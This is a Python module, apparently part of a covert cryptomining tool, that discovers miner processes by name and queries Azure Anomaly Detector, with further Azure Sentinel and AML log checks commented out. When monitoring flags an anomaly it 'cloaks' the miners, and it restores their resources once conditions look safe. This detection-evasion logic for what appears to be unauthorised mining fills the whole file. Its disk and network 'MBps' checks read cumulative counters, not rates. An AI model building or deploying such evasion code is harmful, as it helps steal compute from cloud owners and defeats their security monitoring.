# anomaly_detector.py

import psutil
import logging
import traceback
from time import sleep, time
from threading import Lock, Event
from typing import List, Dict, Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .auxiliary_modules.power_management import get_cpu_power, get_gpu_power
from .auxiliary_modules.temperature_monitor import get_cpu_temperature, get_gpu_temperature
from .cgroup_manager import CgroupManager  # Import CgroupManager

class SafeRestoreEvaluator:
    """
    Lớp đánh giá điều kiện an toàn để khôi phục tài nguyên cho các tiến trình.
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, resource_manager, cgroup_manager: CgroupManager):
        self.config = config
        self.logger = logger
        self.resource_manager = resource_manager
        self.cgroup_manager = cgroup_manager

        # Các ngưỡng baseline
        baseline_thresholds = self.config.get('baseline_thresholds', {})
        self.baseline_cpu_usage_percent = baseline_thresholds.get('cpu_usage_percent', 80)
        self.baseline_gpu_usage_percent = baseline_thresholds.get('gpu_usage_percent', 80)
        self.baseline_ram_usage_percent = baseline_thresholds.get('ram_usage_percent', 80)
        self.baseline_disk_io_usage_mbps = baseline_thresholds.get('disk_io_usage_mbps', 80)
        self.baseline_network_usage_mbps = baseline_thresholds.get('network_usage_mbps', 80)

        # Giới hạn nhiệt độ
        temperature_limits = self.config.get("temperature_limits", {})
        self.cpu_max_temp = temperature_limits.get("cpu_max_celsius", 75)
        self.gpu_max_temp = temperature_limits.get("gpu_max_celsius", 75)

        # Giới hạn công suất
        power_limits = self.config.get("power_limits", {})
        per_device_power = power_limits.get("per_device_power_watts", {})
        self.cpu_max_power = per_device_power.get("cpu", 100)
        self.gpu_max_power = per_device_power.get("gpu", 200)

    def is_safe_to_restore(self, process: MiningProcess) -> bool:
        """
        Kiểm tra xem điều kiện có đủ an toàn để khôi phục tài nguyên cho tiến trình hay không.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.

        Returns:
            bool: True nếu an toàn để khôi phục, ngược lại False.
        """
        # 1) Kiểm tra sự tồn tại của tiến trình
        if not psutil.pid_exists(process.pid):
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
            return False

        # 2) Kiểm tra nhiệt độ CPU
        try:
            cpu_temp = get_cpu_temperature(process.pid)
            if cpu_temp is not None and cpu_temp >= self.cpu_max_temp:
                self.logger.info(
                    f"Nhiệt độ CPU {cpu_temp}°C vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra nhiệt độ CPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra nhiệt độ CPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 3) Kiểm tra nhiệt độ GPU
        try:
            if self.resource_manager.shared_resource_manager.is_gpu_initialized():
                gpu_temps = get_gpu_temperature(process.pid)
                if gpu_temps and any(temp >= self.gpu_max_temp for temp in gpu_temps):
                    self.logger.info(
                        f"Nhiệt độ GPU {gpu_temps}°C vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                    )
                    return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra nhiệt độ GPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra nhiệt độ GPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 4) Kiểm tra công suất CPU
        try:
            cpu_power = get_cpu_power(process.pid)
            if cpu_power is not None and cpu_power >= self.cpu_max_power:
                self.logger.info(
                    f"Công suất CPU {cpu_power}W vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra công suất CPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra công suất CPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 5) Kiểm tra công suất GPU
        try:
            if self.resource_manager.shared_resource_manager.is_gpu_initialized():
                gpu_power = get_gpu_power(process.pid)
                if gpu_power is not None and gpu_power >= self.gpu_max_power:
                    self.logger.info(
                        f"Công suất GPU {gpu_power}W vẫn cao cho tiến trình {process.name} (PID={process.pid})."
                    )
                    return False
        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi kiểm tra công suất GPU.")
            return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra công suất GPU cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # 6) Kiểm tra sử dụng CPU tổng thể
        try:
            total_cpu_usage = psutil.cpu_percent(interval=1)
            if total_cpu_usage >= self.baseline_cpu_usage_percent:
                self.logger.info(f"Sử dụng CPU tổng thể {total_cpu_usage}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng CPU tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 7) Kiểm tra sử dụng RAM tổng thể
        try:
            ram = psutil.virtual_memory()
            total_ram_usage_percent = ram.percent
            if total_ram_usage_percent >= self.baseline_ram_usage_percent:
                self.logger.info(f"Sử dụng RAM tổng thể {total_ram_usage_percent}% vẫn cao.")
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng RAM tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 8) Kiểm tra sử dụng Disk I/O
        try:
            disk_io_counters = psutil.disk_io_counters()
            total_disk_io_usage_mbps = (
                (disk_io_counters.read_bytes + disk_io_counters.write_bytes)
                / (1024 * 1024)
            )
            if total_disk_io_usage_mbps >= self.baseline_disk_io_usage_mbps:
                self.logger.info(
                    f"Sử dụng Disk I/O tổng thể {total_disk_io_usage_mbps:.2f} MBps vẫn cao."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng Disk I/O tổng thể: {e}\n{traceback.format_exc()}"
            )
            return False

        # 9) Kiểm tra sử dụng băng thông mạng
        try:
            net_io_counters = psutil.net_io_counters()
            total_network_usage_mbps = (
                (net_io_counters.bytes_sent + net_io_counters.bytes_recv)
                / (1024 * 1024)
            )
            if total_network_usage_mbps >= self.baseline_network_usage_mbps:
                self.logger.info(
                    f"Sử dụng băng thông mạng tổng thể {total_network_usage_mbps:.2f} MBps vẫn cao."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra sử dụng băng thông mạng: {e}\n{traceback.format_exc()}"
            )
            return False

        # 10) Kiểm tra cảnh báo từ Azure Sentinel
        # try:
        #     alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
        #     if isinstance(alerts, list) and len(alerts) > 0:
        #         self.logger.info(
        #             f"Vẫn còn {len(alerts)} cảnh báo từ Azure Sentinel."
        #         )
        #         return False
        # except Exception as e:
        #     self.logger.error(
        #         f"Lỗi khi kiểm tra cảnh báo từ Azure Sentinel: {e}\n{traceback.format_exc()}"
        #     )
        #     return False

        # # 11) Kiểm tra logs từ Azure Log Analytics (dành cho AML logs nói chung)
        # try:
        #     logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
        #     if isinstance(logs, list) and len(logs) > 0:
        #         self.logger.info(
        #             f"Phát hiện logs AML (AzureDiagnostics) => Cloaking process {process.name} (PID={process.pid})."
        #         )
        #         return False
        # except Exception as e:
        #     self.logger.error(
        #         f"Lỗi khi kiểm tra logs từ Azure Log Analytics: {e}\n{traceback.format_exc()}"
        #     )
        #     return False

        # 12) Kiểm tra bất thường qua Azure Anomaly Detector
        try:
            current_state = self.resource_manager.collect_metrics(process)
            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
            if anomalies_detected:
                self.logger.info(
                    f"Azure Anomaly Detector phát hiện bất thường cho tiến trình {process.name} (PID={process.pid})."
                )
                return False
        except Exception as e:
            self.logger.error(
                f"Lỗi khi kiểm tra bất thường qua Azure Anomaly Detector cho PID={process.pid}: {e}\n{traceback.format_exc()}"
            )
            return False

        # Tất cả kiểm tra đều ổn => an toàn
        self.logger.info(
            f"Điều kiện an toàn để khôi phục tài nguyên cho tiến trình {process.name} (PID: {process.pid})."
        )
        return True

class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường cho các tiến trình khai thác.
    Chịu trách nhiệm giám sát các chỉ số hệ thống và enqueue các tiến trình cần cloaking khi phát hiện bất thường.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        self.logger = logger
        self.config = config

        self.stop_event = Event()

        self.mining_processes: List[MiningProcess] = []
        self.mining_processes_lock = Lock()

        self.gpu_manager = GPUManager()
        self.gpu_initialized = self.gpu_manager.gpu_initialized
        if self.gpu_initialized:
            self.logger.info("GPUManager đã được khởi tạo thành công.")
        else:
            self.logger.warning("GPUManager không được khởi tạo. Các chức năng liên quan đến GPU sẽ bị vô hiệu hóa.")

        self.resource_manager = None
        self.safe_restore_evaluator = None

        # Sử dụng ThreadPoolExecutor để quản lý thread pool
        self.executor = ThreadPoolExecutor(max_workers=10)  # Tăng số worker để xử lý cả cloaking và restoration
        self.task_futures = []

        # Initialize CgroupManager
        try:
            self.cgroup_manager = CgroupManager(logger)
            self.logger.info("CgroupManager đã được khởi tạo thành công.")
        except EnvironmentError as e:
            self.logger.error(f"Không thể khởi tạo CgroupManager: {e}")
            self.cgroup_manager = None

    def set_resource_manager(self, resource_manager):
        """
        Thiết lập ResourceManager cho AnomalyDetector.

        Args:
            resource_manager (ResourceManager): Instance của ResourceManager.
        """
        self.resource_manager = resource_manager
        self.logger.info("ResourceManager đã được thiết lập cho AnomalyDetector.")

        if self.cgroup_manager:
            self.safe_restore_evaluator = SafeRestoreEvaluator(
                self.config,
                self.logger,
                self.resource_manager,
                self.cgroup_manager
            )
        else:
            self.logger.error("CgroupManager không được khởi tạo. SafeRestoreEvaluator sẽ không hoạt động.")

        # Start các task
        future = self.executor.submit(self.anomaly_detection)
        self.task_futures.append(future)

        future_restore = self.executor.submit(self.monitor_restoration)
        self.task_futures.append(future_restore)

    def start(self):
        """
        Bắt đầu AnomalyDetector, bao gồm việc khởi động thread phát hiện bất thường.
        """
        self.logger.info("Đang khởi động AnomalyDetector...")
        self.discover_mining_processes()
        self.logger.info("AnomalyDetector đã được khởi động thành công.")

    def discover_mining_processes(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        cpu_process_name = self.config['processes'].get('CPU', '').lower()
        gpu_process_name = self.config['processes'].get('GPU', '').lower()

        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if cpu_process_name in proc_name or gpu_process_name in proc_name:
                        priority = self.get_process_priority(proc.info['name'])
                        network_interface = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'],
                            proc.info['name'],
                            priority,
                            network_interface,
                            self.logger
                        )
                        mining_proc.is_cloaked = False
                        self.mining_processes.append(mining_proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue

            self.logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.

        Args:
            process_name (str): Tên của tiến trình.

        Returns:
            int: Độ ưu tiên của tiến trình.
        """
        priority_map = self.config.get('process_priority_map', {})
        priority = priority_map.get(process_name.lower(), 1)
        if not isinstance(priority, int):
            self.logger.warning(
                f"Độ ưu tiên cho tiến trình '{process_name}' không phải là int. Sử dụng mặc định = 1. priority={priority}"
            )
            priority = 1
        return priority

    def anomaly_detection(self):
        """
        Task để phát hiện bất thường trong các tiến trình khai thác.
        Sử dụng ThreadPoolExecutor để xử lý các tiến trình song song.
        """
        detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 3600)
        cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
        last_detection_time = 0

        while not self.stop_event.is_set():
            current_time = time()

            # Chỉ chạy nếu đã đủ thời gian giữa hai lần kiểm tra
            if current_time - last_detection_time < detection_interval:
                sleep(1)
                continue

            last_detection_time = current_time

            try:
                self.discover_mining_processes()

                if self.resource_manager is None:
                    self.logger.error("ResourceManager chưa được thiết lập. Không thể tiến hành phát hiện bất thường.")
                    continue

                # Sao chép danh sách để tránh giữ lock khi xử lý
                with self.mining_processes_lock:
                    processes = list(self.mining_processes)

                # Sử dụng ThreadPoolExecutor để xử lý các tiến trình song song
                with ThreadPoolExecutor(max_workers=5) as executor:
                    future_to_process = {
                        executor.submit(self.evaluate_process_anomaly, process, cloak_activation_delay): process
                        for process in processes
                    }

                    for future in as_completed(future_to_process):
                        process = future_to_process[future]
                        try:
                            future.result()
                        except Exception as e:
                            self.logger.error(
                                f"Lỗi khi đánh giá tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
                            )

            except Exception as e:
                self.logger.error(f"Lỗi trong anomaly_detection: {e}\n{traceback.format_exc()}")

            sleep(1)  # Nghỉ ngắn để tránh vòng lặp quá sát

    def evaluate_process_anomaly(self, process: MiningProcess, cloak_activation_delay: int):
        """
        Đánh giá bất thường cho một tiến trình cụ thể và enqueue cloaking nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cloak_activation_delay (int): Thời gian trì hoãn trước khi kích hoạt cloaking (giây).
        """
        try:
            # Kiểm tra sự tồn tại của tiến trình
            if not psutil.pid_exists(process.pid):
                self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại.")
                return

            # 1) Phát hiện bất thường qua Azure Anomaly Detector
            current_state = self.resource_manager.collect_metrics(process)
            anomalies_detected = self.resource_manager.azure_anomaly_detector_client.detect_anomalies(current_state)
            if anomalies_detected:
                self.logger.warning(
                    f"Phát hiện bất thường trong tiến trình {process.name} (PID={process.pid}) thông qua Azure Anomaly Detector. "
                    f"Sẽ kích hoạt cloaking sau {cloak_activation_delay} giây."
                )
                sleep(cloak_activation_delay)
                self.enqueue_cloaking(process)
                process.is_cloaked = True
                return

            # 2) Kiểm tra alerts từ Azure Sentinel
            # alerts = self.resource_manager.azure_sentinel_client.get_recent_alerts(days=2)
            # if isinstance(alerts, list) and len(alerts) > 0:
            #     self.logger.warning(
            #         f"Phát hiện {len(alerts)} cảnh báo từ Azure Sentinel cho PID: {process.pid}"
            #     )
            #     self.enqueue_cloaking(process)
            #     process.is_cloaked = True
            #     return

            # 3) Kiểm tra AML logs từ Azure Log Analytics
            # logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
            # if isinstance(logs, list) and len(logs) > 0:
            #     self.logger.warning(
            #         f"Phát hiện logs AML (AzureDiagnostics) => Cloaking process {process.name} (PID={process.pid})."
            #     )
            #     self.enqueue_cloaking(process)
            #     process.is_cloaked = True
            #     return

        except psutil.NoSuchProcess:
            self.logger.warning(f"Tiến trình PID {process.pid} không tồn tại khi đánh giá bất thường.")
            return
        except Exception as e:
            self.logger.error(f"Lỗi trong evaluate_process_anomaly cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    def enqueue_cloaking(self, process: MiningProcess):
        """
        Enqueue tiến trình vào queue yêu cầu cloaking thông qua ResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            self.resource_manager.enqueue_cloaking(process)
            self.logger.info(f"Đã enqueue yêu cầu cloaking cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue yêu cầu cloaking cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    def enqueue_restoration(self, process: MiningProcess):
        """
        Enqueue tiến trình vào queue yêu cầu khôi phục tài nguyên thông qua ResourceManager.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            self.resource_manager.enqueue_restoration(process)
            self.logger.info(f"Đã enqueue yêu cầu khôi phục tài nguyên cho tiến trình {process.name} (PID={process.pid}).")
        except Exception as e:
            self.logger.error(f"Không thể enqueue yêu cầu khôi phục tài nguyên cho PID={process.pid}: {e}\n{traceback.format_exc()}")

    def monitor_restoration(self):
        """
        Task để xử lý việc khôi phục tài nguyên cho các tiến trình đã cloaked nếu điều kiện an toàn.
        """
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock:
                    cloaked_processes = [proc for proc in self.mining_processes if proc.is_cloaked]

                for process in cloaked_processes:
                    if self.safe_restore_evaluator and self.safe_restore_evaluator.is_safe_to_restore(process):
                        self.logger.info(f"Điều kiện đã đạt để khôi phục tài nguyên cho PID={process.pid}.")
                        self.enqueue_restoration(process)
                        process.is_cloaked = False
                        self.logger.info(f"Đã khôi phục tài nguyên cho tiến trình {process.name} (PID={process.pid}).")
                    else:
                        self.logger.debug(f"Điều kiện chưa đạt để khôi phục tài nguyên cho PID={process.pid}.")

                sleep(60)  # Kiểm tra mỗi 60 giây

            except Exception as e:
                self.logger.error(f"Lỗi trong monitor_restoration: {e}\n{traceback.format_exc()}")
                sleep(60)  # Đợi trước khi thử lại

    def stop(self):
        """
        Dừng AnomalyDetector, bao gồm việc dừng thread phát hiện bất thường và shutdown ThreadPoolExecutor.
        """
        self.logger.info("Đang dừng AnomalyDetector...")
        self.stop_event.set()
        # Chờ tất cả các task đã được submit hoàn thành
        self.executor.shutdown(wait=True)
        self.logger.info("AnomalyDetector đã dừng thành công.")
